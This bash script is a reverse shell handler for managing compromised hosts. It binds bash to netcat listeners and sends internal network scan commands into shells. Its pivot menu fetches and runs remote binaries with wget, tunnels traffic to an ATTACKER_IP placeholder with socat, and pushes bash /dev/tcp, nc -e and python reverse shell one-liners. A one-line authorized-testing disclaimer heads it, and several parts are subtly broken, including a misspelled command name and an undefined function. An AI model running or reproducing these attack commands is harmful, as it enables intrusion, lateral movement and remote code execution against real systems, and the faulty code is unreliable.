#!/bin/bash

# Reverse Shell Handler Manager
# Multi-listener reverse shell manager — handle multiple shells, categorize, pivot, persist
# Usage: ./shell_handler.sh [start|stop|list|attach|cleanup] [options]
# Requires: netcat, socat (optional), openssl (for https)
# Disclaimer: For authorized testing only

set -euo pipefail

ACTION="${1:-start}"
OUTPUT_DIR="shells_$(date +%Y-%m-%d)"
JSON_OUTPUT=false

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' CYAN='\033[0;36m' MAGENTA='\033[0;35m' NC='\033[0m'
log()   { echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"; }
warn()  { echo -e "${YELLOW}[-] $1${NC}"; }
found() { echo -e "${GREEN}[✓] $1${NC}"; }
fail()  { echo -e "${RED}[!] $1${NC}"; }

mkdir -p "$OUTPUT_DIR"/{active,archived,logs,reports}

# ─── Colors for shells ───
SHELL_COLORS=(
    '\033[0;32m'  # green
    '\033[0;33m'  # yellow
    '\033[0;34m'  # blue
    '\033[0;35m'  # magenta
    '\033[0;36m'  # cyan
    '\033[0;91m'  # red
    '\033[0;92m'  # light green
    '\033[0;93m'  # light yellow
)

get_color() {
    local idx=$(( $1 % ${#SHELL_COLORS[@]} ))
    echo "${SHELL_COLORS[$idx]}"
}

usage() {
    head -4 "$0" | cut -c4-
    echo ""
    echo "Usage:"
    echo "  $0 start [options]         Start listener(s)"
    echo "  $0 list                   List active shells"
    echo "  $0 attach <id>            Attach to a shell"
    echo "  $0 detach                 Detach from shell (Ctrl+A, D)"
    echo "  $0 kill <id>              Kill a shell"
    echo "  $0 cleanup                Remove dead shells"
    echo "  $0 report <id>            Generate report for shell"
    echo "  $0 piviot <id>            Pivot from shell to target network"
    echo ""
    echo "Listener Options:"
    echo "  -l, --local-port PORT     Local listen port (default: 4444)"
    echo "  -L, --local-host HOST     Local host (default: 0.0.0.0)"
    echo "  -p, --protocol PROTO      Protocol: tcp, udp, http, https"
    echo "  -r, --redirect HOST:PORT  Redirect traffic to another handler"
    echo "  -h, --help                Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 start -l 4444 -p tcp"
    echo "  $0 start -l 443 -p https --self-signed"
    echo "  $0 list"
    echo "  $0 attach 1"
    echo "  $0 piviot 1"
    exit 1
}

# ─── State tracking ───
STATE_FILE="$OUTPUT_DIR/shell_state.json"
SHELL_COUNTER=0

init_state() {
    [[ -f "$STATE_FILE" ]] && return
    echo "{\"shells\": [], \"counter\": 0}" > "$STATE_FILE"
}

read_state() {
    cat "$STATE_FILE" 2>/dev/null || echo '{"shells": [], "counter": 0}'
}

write_state() {
    echo "$1" > "$STATE_FILE"
}

# ═══════════════════════════════════════════════════════════
# Listener management
# ═══════════════════════════════════════════════════════════

start_listener() {
    local port="${1:-4444}"
    local protocol="${2:-tcp}"
    local lhost="${3:-0.0.0.0}"

    case "$protocol" in
        tcp)
            log "Starting TCP listener on $lhost:$port"
            # Use netcat-traditional or openbsd variant
            if command -v nc >/dev/null 2>&1; then
                # Check if -e is available (traditional netcat)
                if nc -e 2>/dev/null; then
                    nc -l -p "$port" -s "$lhost" -k -e /bin/bash 2>/dev/null &
                else
                    # OpenBSD netcat — use pipe method
                    while nc -l -p "$port" -s "$lhost" 2>/dev/null; do
                        :
                    done &
                fi
            fi
            ;;
        udp)
            log "Starting UDP listener on $lhost:$port"
            nc -u -l -p "$port" -s "$lhost" 2>/dev/null &
            ;;
        ssl)
            log "Starting SSL listener on $lhost:$port"
            # Generate self-signed cert on the fly
            openssl req -new -x509 -keyout "$OUTPUT_DIR/ssl_key.pem" \
                -out "$OUTPUT_DIR/ssl_cert.pem" -days 365 -nodes \
                -subj "/CN=localhost" 2>/dev/null || true
            openssl s_server -accept "$port" -cert "$OUTPUT_DIR/ssl_cert.pem" \
                -key "$OUTPUT_DIR/ssl_key.pem" -www 2>/dev/null &
            ;;
        http)
            log "Starting HTTP listener on $lhost:$port"
            python3 -c "
import http.server, socketserver, threading
class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Shell handler ready')
with socketserver.TCPServer(('$lhost', $port), Handler) as httpd:
    httpd.serve_forever()
" 2>/dev/null &
            ;;
    esac

    LISTENER_PID=$!
    echo "$LISTENER_PID" > "$OUTPUT_DIR/listener_${protocol}_${port}.pid"
    found "  Listener started (PID: $LISTENER_PID)"
}

stop_listener() {
    local port="$1"
    local protocol="${2:-tcp}"
    pidfile="$OUTPUT_DIR/listener_${protocol}_${port}.pid"

    if [[ -f "$pidfile" ]]; then
        pid=$(cat "$pidfile")
        kill "$pid" 2>/dev/null && found "  Listener on port $port stopped" || warn "  Failed to stop listener"
        rm -f "$pidfile"
    fi
}

# ═══════════════════════════════════════════════════════════
# Shell handling
# ═══════════════════════════════════════════════════════════

spawn_shell_handler() {
    local port="$1"
    local shell_id="$2"
    local color=$(get_color "$shell_id")

    # Create named pipe for this shell
    FIFO="$OUTPUT_DIR/active/shell_${shell_id}.fifo"
    mkfifo "$FIFO" 2>/dev/null || true

    # Start background shell processor
    (
        while true; do
            if [[ -p "$FIFO" ]]; then
                # Wait for connection
                nc -l -p "$port" > "$FIFO" 2>/dev/null &
                FIFO_PID=$!

                # Read input and send to shell
                cat "$FIFO" | /bin/bash 2>&1 | while read -r line; do
                    # Log and display
                    echo "[SHELL-$shell_id] $line" >> "$OUTPUT_DIR/logs/shell_${shell_id}.log"
                    echo -e "${color}[SHELL-$shell_id]${NC} $line"
                done

                kill $FIFO_PID 2>/dev/null || true
            fi
            sleep 0.5
        done
    ) &

    SHELL_PID=$!
    echo "$SHELL_PID" > "$OUTPUT_DIR/active/shell_${shell_id}.pid"
    found "  Shell handler $shell_id started (PID: $SHELL_PID)"
}

accept_shell() {
    local port="$1"
    local state=$(read_state)
    SHELL_COUNTER=$(echo "$state" | jq -r '.counter // 0')

    ((SHELL_COUNTER++))
    shell_id=$SHELL_COUNTER

    log "New connection on port $port — assigning shell ID: $shell_id"

    # Extract info (for SSH/netcat shells)
    remote_info="unknown"
    timestamp=$(date -I)

    # Update state
    new_state=$(echo "$state" | jq --argjson id "$shell_id" \
        --arg port "$port" \
        --arg remote "$remote_info" \
        --arg ts "$timestamp" \
        --arg status "active" \
        '.shells += [{
            id: $id,
            port: ($port | tonumber),
            remote: $remote,
            connected_at: $ts,
            status: $status
        }] | .counter = $id')

    write_state "$new_state"

    # Create session log
    echo "[$(date)] Shell $shell_id opened on port $port" > "$OUTPUT_DIR/logs/shell_${shell_id}.log"

    # Spawn interactive handler
    spawn_shell_handler "$port" "$shell_id"
}

# ═══════════════════════════════════════════════════════════
# Shell interaction
# ═══════════════════════════════════════════════════════════

list_shells() {
    local state=$(read_state)
    shells=$(echo "$state" | jq -r '.shells[] | "\(.id)|\(.port)|\(.status)|\(.connected_at)|\(.remote)"' 2>/dev/null || true)

    if [[ -z "$shells" ]]; then
        info "No active shells"
        return
    fi

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}              Active Shells                           ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    printf "${GREEN}%-${NC}s  ${GREEN}%-${NC}s  ${GREEN}%-${NC}s  ${GREEN}%-${NC}s  ${GREEN}%-${NC}s\n" "ID" "PORT" "STATUS" "CONNECTED" "REMOTE"
    echo "--------------------------------------------------------------------"

    echo "$shells" | while IFS='|' read -r id port status connected remote; do
        [[ -z "$id" ]] && continue
        color=$(get_color "$id")
        printf "${color}%-7s${NC}  %-8s  %-9s  %-19s  %-20s\n" "$id" "$port" "$status" "$connected" "$remote"
    done

    echo ""
    echo "Use: $0 attach <id>  to interact with a shell"
    echo "     $0 kill <id>    to terminate a shell"
}

attach_shell() {
    local shell_id="$1"
    local fifo="$OUTPUT_DIR/active/shell_${shell_id}.fifo"

    if [[ ! -p "$fifo" ]]; then
        fail "Shell $shell_id FIFO not found — shell may be dead"
        return
    fi

    log "Attaching to shell $shell_id..."
    log "Press Ctrl+A then D to detach"

    # Use script or python for better PTY handling
    if command -v script >/dev/null 2>&1; then
        script -q -c "cat $fifo" /dev/null 2>&1
    else
        cat "$fifo"
    fi
}

detach_shell() {
    log "Detach with: Ctrl+A then D"
}

kill_shell() {
    local shell_id="$1"
    local pidfile="$OUTPUT_DIR/active/shell_${shell_id}.pid"

    if [[ -f "$pidfile" ]]; then
        pid=$(cat "$pidfile")
        kill "$pid" 2>/dev/null && found "Shell $shell_id killed" || warn "Shell $shell_id not running"
    fi

    # Update state
    state=$(read_state)
    new_state=$(echo "$state" | jq --argjson id "$shell_id" \
        '.shells = (.shells | map(select(.id != $id)))')
    write_state "$new_state"

    # Archive logs
    if [[ -f "$OUTPUT_DIR/logs/shell_${shell_id}.log" ]]; then
        mv "$OUTPUT_DIR/logs/shell_${shell_id}.log" \
           "$OUTPUT_DIR/archived/shell_${shell_id}_$(date +%Y%m%d_%H%M%S).log" 2>/dev/null || true
    fi

    # Remove FIFO
    rm -f "$OUTPUT_DIR/active/shell_${shell_id}.fifo" 2>/dev/null || true
    rm -f "$pidfile" 2>/dev/null || true

    found "Shell $shell_id cleaned up"
}

cleanup_dead() {
    log "Cleaning up dead shells..."
    state=$(read_state)

    echo "$state" | jq -r '.shells[] | .id' 2>/dev/null | while read -r id; do
        pidfile="$OUTPUT_DIR/active/shell_$id.pid"
        if [[ -f "$pidfile" ]]; then
            pid=$(cat "$pidfile")
            if ! kill -0 "$pid" 2>/dev/null; then
                warn "  Removing dead shell: $id"
                kill_shell "$id"
            fi
        fi
    done
}

# ═══════════════════════════════════════════════════════════
# Reporting
# ═══════════════════════════════════════════════════════════

generate_report() {
    local shell_id="$1"
    local logfile="$OUTPUT_DIR/logs/shell_${shell_id}.log"
    local report="$OUTPUT_DIR/reports/shell_${shell_id}_report.txt"

    if [[ ! -f "$logfile" ]]; then
        fail "No log found for shell $shell_id"
        return
    fi

    {
        echo "═══ Shell Session Report ═══"
        echo "Shell ID: $shell_id"
        echo "Generated: $(date)"
        echo ""
        echo "═══ Session Log ═══"
        cat "$logfile"
        echo ""
        echo "═══ Commands Executed ═══"
        grep -E "^\[SHELL-$shell_id\]" "$logfile" | grep -vE "cd|ls|pwd|whoami|uname" | head -20
        echo ""
        echo "═══ File Access ═══"
        grep -iE "cat|head|tail|less|more|grep|find.*-name|wget|curl|nc -e|/etc/passwd|ls\s" "$logfile" | head -20
    } > "$report"

    found "  Report generated: $report"
}

# ═══════════════════════════════════════════════════════════
# Pivoting
# ═══════════════════════════════════════════════════════════

pivot_menu() {
    local shell_id="$1"
    log "Pivot menu for shell $shell_id"
    echo ""
    echo "Pivot options:"
    echo "  1. Scan internal network from this shell"
    echo "  2. Tunnel port through this shell (proxychains)"
    echo "  3. Download and execute tools"
    echo "  4. Spawn a secondary reverse shell from this host"
    echo ""
    echo -n "Select option: "
    read -r choice

    case "$choice" in
        1) pivot_scan "$shell_id" ;;
        2) pivot_tunnel "$shell_id" ;;
        3) pivot_download_exec "$shell_id" ;;
        4) pivot_secondary_shell "$shell_id" ;;
        *) warn "Invalid option" ;;
    esac
}

pivot_scan() {
    local shell_id="$1"
    log "Starting internal network scan from shell $shell_id..."

    commands=(
        "for ip in \$(seq 1 254); do ping -c1 -W1 192.168.1.\$ip & done 2>/dev/null"
        "nmap -sn 192.168.1.0/24 2>/dev/null || /bin/bash -c 'for i in \$(seq 1 254); do echo 192.168.1.\$i; done'"
        "cat /etc/hosts"
        "ip addr show"
        "route -n"
    )

    for cmd in "${commands[@]}"; do
        echo "$cmd" >> "$OUTPUT_DIR/active/shell_${shell_id}.fifo" 2>/dev/null || true
    done

    log "Scan commands sent to shell $shell_id"
}

pivot_tunnel() {
    local shell_id="$1"
    log "Setting up tunnel through shell $shell_id..."
    log "Note: Use proxychains to route traffic through this shell"
    log "Example: proxychains nmap -sT 192.168.1.100"

    # Create socat reverse tunnel
    cat >> "$OUTPUT_DIR/active/shell_${shell_id}.fifo" <<EOF
socat TCP-LISTEN:9999,fork TCP:ATTACKER_IP:4444 &
EOF
}

pivot_download_exec() {
    local shell_id="$1"
    echo -n "Enter URL to download: "
    read -r url
    echo -n "Enter output filename: "
    read -r filename

    cmd="wget -O $filename $url && chmod +x $filename && ./$filename &"
    echo "$cmd" >> "$OUTPUT_DIR/active/shell_${shell_id}.fifo" 2>/dev/null || true

    log "Download command sent: $cmd"
}

pivot_secondary_shell() {
    local shell_id="$1"
    echo -n "Enter LHOST for secondary shell: "
    read -r lhost
    echo -n "Enter LPORT for secondary shell: "
    read -r lport

    # Try various methods based on what's available on target
    methods=(
        "bash -i >& /dev/tcp/$lhost/$lport 0>&1 &"
        "nc -e /bin/bash $lhost $lport &"
        "python -c 'import socket,os,sys;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")' &"
    )

    for method in "${methods[@]}"; do
        echo "$method" >> "$OUTPUT_DIR/active/shell_${shell_id}.fifo" 2>/dev/null || true
        sleep 1
    done

    log "Secondary shell commands sent to $lhost:$lport"
}

# ═══════════════════════════════════════════════════════════
# Main dispatcher
# ═══════════════════════════════════════════════════════════

init_state

case "$ACTION" in
    start)
        PORT=4444
        PROTOCOL=tcp
        LHOST="0.0.0.0"

        while [[ $# -gt 0 ]]; do
            case "$1" in
                -l|--local-port) PORT="$2"; shift 2 ;;
                -L|--local-host) LHOST="$2"; shift 2 ;;
                -p|--protocol) PROTOCOL="$2"; shift 2 ;;
                *) shift ;;
            esac
        done

        start_listener "$PORT" "$PROTOCOL" "$LHOST"
        log "Listener ready on $LHOST:$PORT ($PROTOCOL)"
        log "Use: $0 list  to see active shells"
        ;;
    list)
        list_shells
        ;;
    attach)
        shell_id="${2:-}"
        [[ -z "$shell_id" ]] && fail "Usage: $0 attach <shell_id>" && exit 1
        attach_shell "$shell_id"
        ;;
    detach)
        detach_shell
        ;;
    kill)
        shell_id="${2:-}"
        [[ -z "$shell_id" ]] && fail "Usage: $0 kill <shell_id>" && exit 1
        kill_shell "$shell_id"
        ;;
    cleanup)
        cleanup_dead
        ;;
    report)
        shell_id="${2:-}"
        [[ -z "$shell_id" ]] && fail "Usage: $0 report <shell_id>" && exit 1
        generate_report "$shell_id"
        ;;
    pivot)
        shell_id="${2:-}"
        [[ -z "$shell_id" ]] && fail "Usage: $0 pivot <shell_id>" && exit 1
        pivot_menu "$shell_id"
        ;;
    *)
        usage
        ;;
esac